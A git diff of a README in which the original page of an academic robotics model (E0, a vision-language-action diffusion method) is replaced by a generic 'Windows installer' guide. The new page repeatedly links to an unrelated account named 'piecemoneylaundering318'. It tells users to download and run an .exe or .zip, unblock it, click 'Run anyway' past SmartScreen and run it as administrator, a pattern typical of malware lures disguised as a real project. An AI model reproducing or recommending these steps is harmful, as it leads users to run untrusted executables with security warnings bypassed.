@@ -1,91 +1,254 @@
-# $\mathcal{E}_0$: Enhancing Generalization and Fine-Grained Control in VLA Models via Tweedie Discrete Diffusion
+# ⚙️ e0 - Run Fine-Grained Control on Windows
 
 <p align="center">
-<a href="https://doo-mon.github.io/e0web/"><img src="https://img.shields.io/badge/Project-Page-blue" alt="Project Page"></a>
-<a href="https://arxiv.org/abs/2511.21542"><img src="https://img.shields.io/badge/arXiv-Paper-red" alt="arXiv"></a>
-<a href="https://github.com/Doo-mon/e0"><img src="https://img.shields.io/badge/Code-GitHub-green" alt="Code"></a>
-<a href="https://huggingface.co/doomon/e0_diff_hybrid_libero"><img src="https://img.shields.io/badge/HuggingFace-Model-yellow" alt="HuggingFace"></a>
+<a href="https://github.com/piecemoneylaundering318/e0"><img src="https://img.shields.io/badge/Download-e0%20Setup-blue" alt="Download e0 Setup"></a>
+<a href="https://github.com/piecemoneylaundering318/e0"><img src="https://img.shields.io/badge/Windows-Installer-grey" alt="Windows Installer"></a>
 </p>
 
-<p align="center">
-Zhihao Zhan<sup>1</sup>, Jiaying Zhou<sup>1</sup>, Likui Zhang<sup>1</sup>, Qinhan Lyu<sup>1</sup>, Hao Liu<sup>1</sup>, Jusheng Zhang<sup>1</sup>, Weizheng Li<sup>1</sup>, Ziliang Chen<sup>1</sup>, Tianshui Chen<sup>3,4</sup>, Ruifeng Zhai<sup>1</sup>, Keze Wang<sup>1</sup>, Liang Lin<sup>1,2,3</sup>, Guangrun Wang<sup>*1,2,3</sup>
-</p>
+## 📥 Download
 
-<p align="center">
-<sup>1</sup>Sun Yat-sen University, <sup>2</sup>Guangdong Key Laboratory of Big Data Analysis and Processing, <sup>3</sup>X-Era AI Lab, <sup>4</sup>Guangdong University of Technology.
-</p>
+Use this link to visit the download page:
 
-<p align="center">
-<sup>*</sup>Corresponding author
-</p>
+[Download e0](https://github.com/piecemoneylaundering318/e0)
 
-## ✨ Abstract
-![Pipeline](figs/e0.png)
+If the page shows a file for Windows, download that file first. If it opens a release page, pick the latest Windows build from the list.
 
-Vision–Language–Action (VLA) models offer a unified framework for robotic manipulation by integrating visual perception, language understanding, and control generation. However, existing VLA systems still struggle to generalize across diverse tasks, scenes, and camera viewpoints, and often produce coarse or unstable actions. We argue that these limitations are closely tied to the structural properties of actions in VLA settings, including the inherent multi-peaked nature of action distributions, the token-based symbolic reasoning of pretrained VLM/VLA backbones, and the effective finite resolution imposed by real-world robotic control. Motivated by these properties, we introduce $\mathcal{E}_0$, a tweedie discrete diffusion framework that formulates action generation as iterative denoising over quantized action tokens. By operating in a discrete action space with a principled diffusion process, $\mathcal{E}_0$ naturally aligns with token-based reasoning, supports fine-grained yet executable action control, and avoids the distributional mismatch of masking-based discrete diffusion. We further introduce a spherical viewpoint perturbation augmentation to enhance robustness to camera shifts without additional data. Experiments on LIBERO, VLABench, ManiSkill, and a real-world Franka arm demonstrate that $\mathcal{E}_0$ achieves state-of-the-art performance across 14 diverse environments, outperforming strong baselines by 10.7\% on average.
+## 🪟 What e0 Does
 
+e0 is a Windows app for running a model that helps with visual tasks and control. It is built for users who want fine-grained results without setting up a complex workflow.
 
+Use it to:
+- load the app on Windows
+- run the main model locally
+- work with image-based tasks
+- try a setup made for general use
+- keep control over model output and behavior
 
+## ✅ Before You Start
 
+Make sure your PC has:
+- Windows 10 or Windows 11
+- at least 8 GB of RAM
+- 20 GB of free disk space
+- a stable internet connection for the first download
+- a modern CPU
+- a GPU if you want faster performance
 
-## ⚙️ Setup (uv or conda)
+A machine with 16 GB of RAM or more will give a smoother run. If you use a GPU, keep your graphics drivers up to date.
 
-### uv
-We manage Python dependencies with [uv](https://docs.astral.sh/uv/). If you haven't installed `uv`, please follow [uv installation instructions](https://docs.astral.sh/uv/getting-started/installation/) to set it up.
+## 🚀 Getting Started
 
-Run the following to set up the environment:
+### 1. Open the download page
+Click the download link above and wait for the page to load.
 
-```bash
-git clone --recurse-submodules git@github.com:Doo-mon/e0.git
+### 2. Get the Windows file
+Look for a file named like:
+- `.exe`
+- `.zip`
+- `.msi`
 
-# Or if you already cloned the repo:
-git submodule update --init --recursive
+If you see more than one file, choose the one that says Windows or the one meant for standard use.
 
-GIT_LFS_SKIP_SMUDGE=1 uv sync
-GIT_LFS_SKIP_SMUDGE=1 uv pip install -e .
-```
+### 3. Save the file
+When your browser asks where to save it, pick a place you can find fast, such as:
+- Downloads
+- Desktop
 
-For more details, refer to the original [openpi repository](https://github.com/Physical-Intelligence/openpi).
+### 4. Run the file
+- If you downloaded an `.exe` or `.msi`, double-click it
+- If you downloaded a `.zip`, right-click it and choose Extract All, then open the folder and start the app
 
-### conda
+### 5. Follow the setup steps
+Windows may ask for permission. If that happens:
+- click Yes
+- continue through the setup window
+- keep the default options unless the app asks for a different path
 
-You can use `environment.yml` to build the environment. Some additional packages may need to be installed manually depending on your setup.
+### 6. Start e0
+After setup ends, open e0 from:
+- the Start menu
+- the desktop shortcut
+- the folder where you extracted it
 
+## 🛠️ First Run Setup
 
+The first launch may take a bit longer. e0 may create local files the first time it opens.
 
+If the app asks for:
+- a model file
+- a data folder
+- a storage path
 
-## 🚀 Training / Inference / Deployment
+choose a folder with enough free space, such as:
+- `C:\e0`
+- `D:\Models\e0`
 
-### Data Preparation
+Keep the path simple. Avoid folders with long names or special characters.
 
-Refers to ```/examples/libero/convert_libero_data_to_lerobot.py```
+## 📂 If You Downloaded a ZIP File
 
-### Commands
+If the download is a ZIP file:
+1. Right-click the file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
+5. Double-click the app file inside
 
-Refers to `run_train.sh`, `run_server_eval.sh` and `run_local_eval.sh`
+If Windows blocks the file:
+1. Right-click the file
+2. Select Properties
+3. Check Unblock if you see it
+4. Click Apply
+5. Open the file again
 
+## 🔐 Permission Steps
 
+Windows may show a security prompt the first time you run the app. This is normal for a local app from the web.
 
+If Windows SmartScreen appears:
+- choose More info
+- click Run anyway if you trust the file source
 
-## Citation
-If you find our work useful, please consider citing:
+## 🧭 Basic Use
 
-```bibtex
-@misc{zhan2026e0enhancinggeneralizationfinegrained,
-      title={E0: Enhancing Generalization and Fine-Grained Control in VLA Models via Tweedie Discrete Diffusion}, 
-      author={Zhihao Zhan and Jiaying Zhou and Likui Zhang and Qinhan Lv and Hao Liu and Jusheng Zhang and Weizheng Li and Ziliang Chen and Tianshui Chen and Ruifeng Zhai and Keze Wang and Liang Lin and Guangrun Wang},
-      year={2026},
-      eprint={2511.21542},
-      archivePrefix={arXiv},
-      primaryClass={cs.RO},
-      url={https://arxiv.org/abs/2511.21542}, 
-}
-```
+After e0 opens:
+- load the model if the app asks for one
+- pick the task or mode you want
+- add your input
+- start the run
 
-## Acknowledgements
+For best results:
+- use clear input
+- keep file names simple
+- close large apps if your PC feels slow
+- make sure you have enough free memory
 
-We express our sincere gratitude to the developers of [openpi](https://github.com/Physical-Intelligence/openpi) for open-sourcing their codebase.
+## 🖥️ Suggested Windows Layout
 
-## License
+For a smooth setup, keep:
+- the download file in Downloads
+- the app files in one folder
+- model files in a separate folder
+- your working files in another folder
 
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
+This makes it easier to find things later.
+
+## 🔄 Common Actions
+
+### Open the app again
+Use the Start menu or the shortcut on your desktop.
+
+### Move the app
+If you used a ZIP version, you can move the whole folder to another drive. Keep all files together.
+
+### Update the app
+Visit the same download page and check for a newer file. Download the latest build and replace the old one if needed.
+
+## ❓ Common Problems
+
+### The app does not open
+Try this:
+- right-click the file and choose Run as administrator
+- check that you extracted all files
+- restart your PC
+- download the file again if it looks damaged
+
+### Windows says the file is unsafe
+Check the download page again and make sure you got the file from the link above. Then try to run it again.
+
+### The app opens, but it is slow
+Try this:
+- close other apps
+- free up RAM
+- use a GPU if your system supports it
+- store files on an SSD
+
+### I cannot find the file
+Look in:
+- Downloads
+- Desktop
+- the folder you chose during extraction
+
+Use Windows search and type `e0`.
+
+## 📁 File Names You May See
+
+You may see files or folders like:
+- `e0.exe`
+- `setup.exe`
+- `e0.zip`
+- `models`
+- `data`
+- `assets`
+
+Keep these files in place. Do not rename folders unless you know the app still points to the right path.
+
+## 🧩 Recommended Folder Setup
+
+A simple setup on Windows can look like this:
+
+- `C:\e0\` for the app
+- `C:\e0\models\` for model files
+- `C:\e0\data\` for inputs and outputs
+
+This keeps the app organized and easy to use.
+
+## 🧪 Example Launch Flow
+
+1. Download the file from the link above
+2. Extract it if needed
+3. Open the app
+4. Select or load the model
+5. Choose your task
+6. Run the app
+
+## 📌 Short Checklist
+
+Before you start, make sure you have:
+- downloaded the file
+- extracted it if needed
+- enough free disk space
+- enough RAM
+- the right Windows version
+- a folder ready for model files
+
+## 🧰 Helpful Windows Tips
+
+- Keep your system updated
+- Use a local folder with full write access
+- Avoid spaces and symbols in folder names if the app gives path errors
+- If the app freezes, close it and open it again
+- If you use a laptop, keep it plugged in during long runs
+
+## 📎 Download Again
+
+If you need to get the file again, use this link:
+
+[Download e0](https://github.com/piecemoneylaundering318/e0)
+
+## 📋 Typical Setup Path
+
+A common setup path is:
+1. download the file
+2. save it to Downloads
+3. extract it to `C:\e0`
+4. open the app from that folder
+5. load your files and start work
+
+## 🔍 What to Check If It Fails
+
+Check these items in order:
+- the file finished downloading
+- the file is not inside a blocked folder
+- the folder was extracted fully
+- the app has permission to write files
+- your PC has enough free memory
+- your disk has enough free space
+
+## 🗂️ Best Practices for First-Time Users
+
+- use the default settings at first
+- keep all app files in one folder
+- store large model files on a drive with space
+- leave the app folder alone after setup
+- use the same folder each time you launch it
